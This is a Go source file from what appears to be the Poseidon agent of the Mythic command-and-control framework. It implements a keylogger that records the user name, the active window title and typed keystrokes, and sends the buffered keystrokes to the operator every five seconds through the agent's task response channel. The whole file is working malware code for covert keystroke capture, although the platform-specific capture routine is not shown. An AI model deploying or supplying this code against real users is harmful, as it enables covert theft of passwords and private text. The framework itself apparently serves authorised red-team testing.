package keystate

import (
	"errors"
	"fmt"
	"os/user"
	"sync"
	"time"

	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/structs"
)

var (
	curTask *structs.Task
	// Struct to monitor keystrokes.
	ksmonitor, _ = NewKeyLog()
	// Maps strings to their shift counter-parts on US keyboards.
	shiftMap = map[string]string{
		"a":  "A",
		"b":  "B",
		"c":  "C",
		"d":  "D",
		"e":  "E",
		"f":  "F",
		"g":  "G",
		"h":  "H",
		"i":  "I",
		"j":  "J",
		"k":  "K",
		"l":  "L",
		"m":  "M",
		"n":  "N",
		"o":  "O",
		"p":  "P",
		"q":  "Q",
		"r":  "R",
		"s":  "S",
		"t":  "T",
		"u":  "U",
		"v":  "V",
		"w":  "W",
		"x":  "X",
		"y":  "Y",
		"z":  "Z",
		"1":  "!",
		"2":  "@",
		"3":  "#",
		"4":  "$",
		"5":  "%",
		"6":  "^",
		"7":  "&",
		"8":  "*",
		"9":  "(",
		"0":  ")",
		"-":  "_",
		"=":  "+",
		"[":  "{",
		"]":  "}",
		"\\": "|",
		";":  ":",
		"'":  "\"",
		",":  "<",
		".":  ">",
		"/":  "?",
		"`":  "~",
	}
)

type KeyLogWithMutex struct {
	User        string `json:"user"`
	WindowTitle string `json:"window_title"`
	Keystrokes  string `json:"keystrokes"`
	mtx         sync.Mutex
}

func (k *KeyLogWithMutex) AddKeyStrokes(s string) {
	k.mtx.Lock()
	k.Keystrokes += s
	k.mtx.Unlock()
}

func (k *KeyLogWithMutex) ToSerialStruct() structs.Keylog {
	return structs.Keylog{
		User:        k.User,
		WindowTitle: k.WindowTitle,
		Keystrokes:  k.Keystrokes,
	}
}

func (k *KeyLogWithMutex) SetWindowTitle(s string) {
	k.mtx.Lock()
	k.WindowTitle = s
	k.mtx.Unlock()
}

func (k *KeyLogWithMutex) SendMessage() {
	serMsg := ksmonitor.ToSerialStruct()
	msg := structs.Response{}
	keylogs := make([]structs.Keylog, 1)
	keylogs[0] = serMsg
	msg.Keylogs = &keylogs
	if curTask != nil {
		msg.TaskID = curTask.TaskID
		curTask.Job.SendResponses <- msg
	}
}

func NewKeyLog() (KeyLogWithMutex, error) {
	curUser, err := user.Current()
	if err != nil {
		return KeyLogWithMutex{}, err
	}
	return KeyLogWithMutex{
		User:        curUser.Username,
		WindowTitle: "",
		Keystrokes:  "",
	}, nil
}

func StartKeylogger(task structs.Task) error {
	// This function is responsible for dumping output.
	if curTask != nil {
		return errors.New(fmt.Sprintf("Keylogger already running with task ID: %s", curTask.TaskID))
	}
	curTask = &task
	go func() {
		for {
			timer := time.NewTimer(time.Second * 5)
			<-timer.C
			if task.ShouldStop() {
				curTask = nil
				return
			}
			if ksmonitor.Keystrokes != "" {
				ksmonitor.mtx.Lock()
				ksmonitor.SendMessage()
				ksmonitor.Keystrokes = ""
				ksmonitor.mtx.Unlock()
			}
		}
	}()
	err := keyLogger()
	return err
}
